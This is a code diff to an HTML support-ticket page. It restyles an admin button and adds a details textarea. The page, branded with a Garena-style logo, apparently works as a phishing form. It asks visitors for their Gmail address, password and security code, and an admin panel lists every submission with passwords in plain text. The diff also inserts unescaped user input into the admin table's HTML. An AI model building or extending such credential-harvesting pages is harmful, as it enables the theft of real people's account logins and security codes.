@@ -33,14 +33,18 @@
             object-fit: contain;
         }
 
+        /* Icon Only Admin Button */
         .admin-btn {
             background: #f4f4f4;
             border: 1px solid #cccccc;
-            padding: 8px 14px;
-            border-radius: 20px;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
             cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
             color: #333333;
             transition: 0.2s;
         }
@@ -89,7 +93,7 @@
             font-weight: 600;
         }
 
-        .form-group input, .form-group select {
+        .form-group input, .form-group select, .form-group textarea {
             width: 100%;
             padding: 12px 14px;
             border: 1px solid #cccccc;
@@ -100,7 +104,12 @@
             transition: border-color 0.2s;
         }
 
-        .form-group input:focus, .form-group select:focus {
+        .form-group textarea {
+            resize: vertical;
+            min-height: 80px;
+        }
+
+        .form-group input:focus, .form-group select:focus, .form-group textarea:focus {
             border-color: #e4181f;
         }
 
@@ -139,7 +148,7 @@
             padding: 25px;
             border-radius: 12px;
             width: 100%;
-            max-width: 700px;
+            max-width: 800px;
             max-height: 80vh;
             overflow-y: auto;
             position: relative;
@@ -178,7 +187,7 @@
 
     <header class="top-header">
         <img src="garenashare.jpg" alt="Logo" class="brand-logo">
-        <button class="admin-btn" onclick="openModal()">👤 Admin Panel</button>
+        <button class="admin-btn" onclick="openModal()" title="Admin Panel">👤</button>
     </header>
 
     <div class="main-container">
@@ -217,6 +226,11 @@
                     </select>
                 </div>
 
+                <div class="form-group">
+                    <label>Additional Details</label>
+                    <textarea id="additionalDetails" placeholder="Write details or other issues..."></textarea>
+                </div>
+
                 <button type="submit" class="submit-btn">Submit Request</button>
             </form>
         </div>
@@ -251,6 +265,7 @@
                             <th>Password</th>
                             <th>Security Code</th>
                             <th>Problem</th>
+                            <th>Details</th>
                         </tr>
                     </thead>
                     <tbody id="ticketData">
@@ -270,7 +285,8 @@
                 gmail: document.getElementById('gmail').value,
                 password: document.getElementById('password').value,
                 securityCode: document.getElementById('securityCode').value,
-                problemType: document.getElementById('problemType').value
+                problemType: document.getElementById('problemType').value,
+                additionalDetails: document.getElementById('additionalDetails').value
             };
 
             try {
@@ -326,6 +342,7 @@
                                 <td>${item.password}</td>
                                 <td>${item.securityCode}</td>
                                 <td>${item.problemType}</td>
+                                <td>${item.additionalDetails || '-'}</td>
                             </tr>
                         `;
                     });
